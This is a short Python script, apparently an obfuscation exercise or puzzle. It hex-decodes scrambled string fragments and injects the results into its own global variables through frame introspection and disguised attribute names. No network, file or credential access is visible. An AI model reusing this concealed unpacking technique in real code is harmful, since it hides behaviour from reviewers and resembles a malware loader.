import sys
import binascii as ba
from functools import reduce
from itertools import tee

d = ['794068d0664f60225bf74417580d4b99h0a0ff61c2c39bb4b7afefc106a4d7efo7e4y6JdO6g4b6G2c5ifO6N2i6J5I6U1z7I2',
     '16N5i7J29h.0e3y7J8Ocgad1W2Q9i6O1N0i5Ic50M4D1g4w2N7mbY6wdM3m1I733N4D0ca42ZbGcI550M3DbB2meMfT0I0zcY7j5',
     'Q03bZemeY7xaNcj2Q032Z8i6I1scI0m153ibZ0i2Ia62M9T8cd0cMcz2U2y7M5z5Qcz8M7i041w6M6T6g1sbIaneNa1eY3i6Id60',
     'Idj5Yc3dZbW7Mfw2Z2T2Y04eY7T0V8O3g0Y8T5E210M1z6Y8xdM7GdR1m7O8N1T4B7icOaN8C7I5s5Ifn2N7j8b93cB4l5cey9I5',
     '69W5y5J7Odg0c4Gal6f3c3mbV3Ofg8Z2C1J1d8L2CdJf26ZeX4J5z1a7W29dudIaj7O4ncx1ffQe.bebE7E7IbS8x2g4Vet1392d',
     '0740jde0J2z0n2-1dfz7n8Obn2xeA4Z7IdHbNcO8nbYff8qeJ4q57641ic3aY1b9P4co7J4M7C6O6N486L2Q5HfI4X1X57064C9G',
     'hNo6b6b651468ef6f1670287046764f736554f24d12590e4b9759fa63b36d5e7a9fo7c4c7b246f1b6fb0744457fd48165e0d',
     '4f93h0bf27516c7aff980f16fa285cb2e6d8cea86d24a061749fc8c4bee533764764860bd6a917b502e40027bb5fed95o7e4',
     'd772c6f1f66bb704c56f8763768596f3170216c59714ah59773c38dc53b73ae458122922bfa9f0da1a362d84f93f11dabed8',
     '484300d861f9b451ff4bcdbdfo6j6b65c46O9g7v356g5c7t245ffr6e1d7b0j64965Ofg6vby655t7g9ho6AaI7z5a7S3y7D4v7',
     '67J6I1z7d4D6v3b6T8B5Sf-6J6W6d9R742K6l52622U6v1g7W3G6A5yhufO1nc8o72736d5a76477423621a66b87f2754f64313',
     '5d004e92h7595710a0e5a460123bo6kdu6a4Q6j2G6dc46V9I7P3P7s4B55f64P1i5i0F4q9FhM3n8O5gcj5l3jcM2Ocnbgbd6bb',
     's6z8Oen28bMe47b']

for g in reduce('e551f61c'.__class__.__add__, d).split('\157'):
    a = 'ab'
    b = f'f{chr(0o137)}'
    c = getattr(sys._getframe(0), f'{b}glo{a[::-1]}ls')
    h = 97
    e, f = (g[i::2].partition(chr(h ^ 0b1001))[0] for i in range(2))
    g = ''.join(map(chr, (b+(not f-int(str(h)[::-1])) for i, j in (tee(map(ord, e[:1]+f)),) if next(j, None) is not None for f, b in zip(i, j) if (b>>4)^4 or ~b&15)))
    c[getattr(c[a[::-1]], ''.join(c[0]+c[1] for c in zip(a, '2_'))+chr(h^0b1001)+'e'+chr(h^0o31))(e).decode()] = g
